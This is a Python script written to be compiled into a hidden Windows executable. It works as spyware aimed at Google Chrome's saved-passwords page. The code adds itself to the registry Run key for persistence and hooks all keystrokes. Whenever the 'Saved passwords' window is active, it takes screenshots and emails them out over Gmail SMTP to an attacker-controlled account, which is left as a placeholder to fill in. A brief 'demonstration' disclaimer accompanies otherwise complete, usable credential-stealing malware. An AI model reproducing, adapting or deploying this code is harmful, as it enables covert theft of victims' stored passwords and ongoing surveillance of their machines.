'''
Author: Manu Babanu
Date: 03/05/2018
Description: Python code to be converted to exe with pyinstaller. This code is
meant to run in background. Use pyinstaller with option '--onefile' and
'windowed' for that. Once executed the code will run in background
and take screenshots everytime the user is logged in the Google Smart
Lock web page where all saved passwords are. Triggers when unhide a
password field or other keyboard event. Fill the gmail_user and gmail_pwd
with yours.
------- This to be used only used for demonstration purposes-----------
'''

import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from email.MIMEImage import MIMEImage
from _winreg import *
from ctypes import *
import pythoncom
import pyHook
import time
import os
import pyautogui

# email and password used
gmail_user = '********************'
gmail_pwd = '************'
subject = 'See the image in attached!'

# firstly add program to registry so will run at startup


def add_to_reg():
    # using the os python __file__ to instatiate the file path
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = "shutter2.exe"
    new_path = fp+"\\"+file_name
    # keyVal raw string variable with registry name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    # add entry to registry so code will run at every  startup
    newKey = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(newKey, "Hacked", 0, REG_SZ, new_path)


# method to take screenshots
def take_shot():
    pyautogui.screenshot(os.path.dirname(os.path.relpath(__file__)) + 'desktop.png')
    time.sleep(0.5)


# method to send screenshot through email
def send_mail():
    msg = MIMEMultipart()
    msg['From'] = gmail_user
    msg['To'] = gmail_user
    msg['Subject'] = subject
    image_dir = os.path.dirname(os.path.realpath(__file__))
    image_name = 'desktop.png'
    image_data = open(image_dir + '\\' + image_name, 'rb').read()

    text = MIMEText('get the goodies')
    msg.attach(text)
    image = MIMEImage(image_data, image_name)
    msg.attach(image)

    # create smtp session
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.ehlo()
    s.starttls()
    s.ehlo()
    s.login(gmail_user, gmail_pwd)
    s.sendmail(gmail_user, gmail_user, msg.as_string())
    s.close()


# function that use the keyboard events to trigger when the
# google smart lock will be accesed
def keyboard_event(event):
    if event.WindowName == 'Saved passwords - Google Chrome':
        take_shot()
        send_mail()
    return True


add_to_reg()


# create a hook manager
hook = pyHook.HookManager()
# watch for all mouse events
hook.KeyDown = keyboard_event
# set the hook
hook.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
